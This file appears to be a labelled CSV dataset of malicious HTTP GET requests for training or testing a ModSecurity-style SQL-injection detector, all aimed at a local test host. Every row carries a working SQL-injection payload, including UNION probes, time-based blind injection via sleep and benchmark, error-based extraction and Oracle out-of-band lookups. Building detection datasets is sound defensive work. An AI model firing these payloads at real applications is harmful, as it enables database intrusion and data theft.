"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_modsec_learn_sqli_000653","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+dqgr+where+2427%3D2427+and+%283020%3D3020%29%2A6703--","/","p=1%27%29+as+dqgr+where+2427%3D2427+and+%283020%3D3020%29%2A6703--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+dqgr+where+2427%3D2427+and+%283020%3D3020%29%2A6703-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000654","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+dwgv+where+1525%3D1525+union+all+select+null%2Cnull--","/","p=1%27%29+as+dwgv+where+1525%3D1525+union+all+select+null%2Cnull--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+dwgv+where+1525%3D1525+union+all+select+null%2Cnull-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000655","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+eyzk+where+2489%3D2489+and+4386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284386%3D4386%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29--","/","p=1%27%29+as+eyzk+where+2489%3D2489+and+4386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284386%3D4386%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+eyzk+where+2489%3D2489+and+4386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284386%3D4386%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000656","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+fyuh+where+7608%3D7608+and+4241%3Dconvert%28int%2C%28select+char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%284241%3D4241%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29--","/","p=1%27%29+as+fyuh+where+7608%3D7608+and+4241%3Dconvert%28int%2C%28select+char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%284241%3D4241%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+fyuh+where+7608%3D7608+and+4241%3Dconvert%28int%2C%28select+char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%284241%3D4241%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000657","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+ghks+where+5128%3D5128+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23","/","p=1%27%29+as+ghks+where+5128%3D5128+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+ghks+where+5128%3D5128+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000658","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+hwpf+where+5603%3D5603%3Bselect+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3--","/","p=1%27%29+as+hwpf+where+5603%3D5603%3Bselect+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+hwpf+where+5603%3D5603%3Bselect+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000659","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+jrqh+where+6204%3D6204+and+%28select+%2A+from+%28select%28sleep%285%29%29%29gcrr%29%23","/","p=1%27%29+as+jrqh+where+6204%3D6204+and+%28select+%2A+from+%28select%28sleep%285%29%29%29gcrr%29%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+jrqh+where+6204%3D6204+and+%28select+%2A+from+%28select%28sleep%285%29%29%29gcrr%29%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000660","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+jwvp+where+5231%3D5231+and+8189%3D%28select+count%28%2A%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3%29--","/","p=1%27%29+as+jwvp+where+5231%3D5231+and+8189%3D%28select+count%28%2A%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+jwvp+where+5231%3D5231+and+8189%3D%28select+count%28%2A%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000661","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+keom+where+7524%3D7524+and+2716%3D%28select+count%28%2A%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7%29--","/","p=1%27%29+as+keom+where+7524%3D7524+and+2716%3D%28select+count%28%2A%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+keom+where+7524%3D7524+and+2716%3D%28select+count%28%2A%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000662","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+llug+where+2244%3D2244+and+3715+in+%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%283715%3D3715%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29--","/","p=1%27%29+as+llug+where+2244%3D2244+and+3715+in+%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%283715%3D3715%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+llug+where+2244%3D2244+and+3715+in+%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%283715%3D3715%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000663","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+mgko+where+1828%3D1828+and+make_set%288403%3D8403%2C8899%29--","/","p=1%27%29+as+mgko+where+1828%3D1828+and+make_set%288403%3D8403%2C8899%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+mgko+where+1828%3D1828+and+make_set%288403%3D8403%2C8899%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000664","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+nexa+where+6740%3D6740%3Bselect+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3--","/","p=1%27%29+as+nexa+where+6740%3D6740%3Bselect+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+nexa+where+6740%3D6740%3Bselect+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000665","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+pudv+where+2609%3D2609%3B%28select+%2A+from+%28select%28sleep%285%29%29%29srmq%29--","/","p=1%27%29+as+pudv+where+2609%3D2609%3B%28select+%2A+from+%28select%28sleep%285%29%29%29srmq%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+pudv+where+2609%3D2609%3B%28select+%2A+from+%28select%28sleep%285%29%29%29srmq%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000666","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+twny+where+9580%3D9580%3Bbegin+dbms_lock.sleep%285%29%3B+end--","/","p=1%27%29+as+twny+where+9580%3D9580%3Bbegin+dbms_lock.sleep%285%29%3B+end--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+twny+where+9580%3D9580%3Bbegin+dbms_lock.sleep%285%29%3B+end-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000667","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+wjty+where+2971%3D2971%3Bselect+benchmark%285000000%2Cmd5%280x714e4153%29%29%23","/","p=1%27%29+as+wjty+where+2971%3D2971%3Bselect+benchmark%285000000%2Cmd5%280x714e4153%29%29%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+wjty+where+2971%3D2971%3Bselect+benchmark%285000000%2Cmd5%280x714e4153%29%29%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000668","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+wvvo+where+4288%3D4288%3Bselect+%28case+when+%285009%3D1133%29+then+5009+else+5009%2A%28select+5009+from+information_schema.character_sets%29+end%29%23","/","p=1%27%29+as+wvvo+where+4288%3D4288%3Bselect+%28case+when+%285009%3D1133%29+then+5009+else+5009%2A%28select+5009+from+information_schema.character_sets%29+end%29%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+wvvo+where+4288%3D4288%3Bselect+%28case+when+%285009%3D1133%29+then+5009+else+5009%2A%28select+5009+from+information_schema.character_sets%29+end%29%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000669","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+as+zxho+where+5907%3D5907+or+6979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000%2F2%29%29%29%29--","/","p=1%27%29+as+zxho+where+5907%3D5907+or+6979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000%2F2%29%29%29%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+as+zxho+where+5907%3D5907+or+6979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000%2F2%29%29%29%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000670","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+or+%28select+%2A+from+%28select%28sleep%285%29%29%29ydpu%29+and+%28%27zaes%27%3D%27zaes","/","p=1%27%29+or+%28select+%2A+from+%28select%28sleep%285%29%29%29ydpu%29+and+%28%27zaes%27%3D%27zaes","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+or+%28select+%2A+from+%28select%28sleep%285%29%29%29ydpu%29+and+%28%27zaes%27%3D%27zaes HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000671","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+or+%28select+9173+from%28select+count%28%2A%29%2Cconcat%280x7171706a71%2C%28select+%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x+from+information_schema.character_sets+group+by+x%29a%29+and+%28%27iwkg%27%3D%27iwkg","/","p=1%27%29+or+%28select+9173+from%28select+count%28%2A%29%2Cconcat%280x7171706a71%2C%28select+%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x+from+information_schema.character_sets+group+by+x%29a%29+and+%28%27iwkg%27%3D%27iwkg","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+or+%28select+9173+from%28select+count%28%2A%29%2Cconcat%280x7171706a71%2C%28select+%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x+from+information_schema.character_sets+group+by+x%29a%29+and+%28%27iwkg%27%3D%27iwkg HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000672","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+or+4411%3D%28select+count%28%2A%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7%29","/","p=1%27%29+or+4411%3D%28select+count%28%2A%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+or+4411%3D%28select+count%28%2A%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000673","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+or+4915%3D%28select+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3%29--","/","p=1%27%29+or+4915%3D%28select+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+or+4915%3D%28select+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000674","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+or+6793%3D%28select+6793+from+pg_sleep%285%29%29","/","p=1%27%29+or+6793%3D%28select+6793+from+pg_sleep%285%29%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+or+6793%3D%28select+6793+from+pg_sleep%285%29%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000675","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+or+8421%3D%28select+count%28%2A%29+from+generate_series%281%2C5000000%29%29","/","p=1%27%29+or+8421%3D%28select+count%28%2A%29+from+generate_series%281%2C5000000%29%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+or+8421%3D%28select+count%28%2A%29+from+generate_series%281%2C5000000%29%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000676","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+or+8466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29+and+%28%27osov%27+like+%27osov","/","p=1%27%29+or+8466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29+and+%28%27osov%27+like+%27osov","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+or+8466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29+and+%28%27osov%27+like+%27osov HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000677","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+or+9643%3D%28select+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3%29","/","p=1%27%29+or+9643%3D%28select+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+or+9643%3D%28select+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000678","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+or+9643%3D%28select+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3%29+and+%28%27cpfn%27+like+%27cpfn","/","p=1%27%29+or+9643%3D%28select+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3%29+and+%28%27cpfn%27+like+%27cpfn","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+or+9643%3D%28select+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3%29+and+%28%27cpfn%27+like+%27cpfn HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000679","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+or+row%281045%2C7562%29%3E%28select+count%28%2A%29%2Cconcat%280x7171706a71%2C%28select+%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x+from+%28select+8488+union+select+5584+union+select+3051+union+select+1210%29a+group+by+x%29+and+%28%27cogk%27%3D%27cogk","/","p=1%27%29+or+row%281045%2C7562%29%3E%28select+count%28%2A%29%2Cconcat%280x7171706a71%2C%28select+%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x+from+%28select+8488+union+select+5584+union+select+3051+union+select+1210%29a+group+by+x%29+and+%28%27cogk%27%3D%27cogk","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+or+row%281045%2C7562%29%3E%28select+count%28%2A%29%2Cconcat%280x7171706a71%2C%28select+%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x+from+%28select+8488+union+select+5584+union+select+3051+union+select+1210%29a+group+by+x%29+and+%28%27cogk%27%3D%27cogk HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000680","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+or+sleep%285%29+and+%28%27kgbm%27%3D%27kgbm","/","p=1%27%29+or+sleep%285%29+and+%28%27kgbm%27%3D%27kgbm","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+or+sleep%285%29+and+%28%27kgbm%27%3D%27kgbm HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000681","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+or+sleep%285%29+and+%28%27mdmr%27+like+%27mdmr","/","p=1%27%29+or+sleep%285%29+and+%28%27mdmr%27+like+%27mdmr","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+or+sleep%285%29+and+%28%27mdmr%27+like+%27mdmr HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
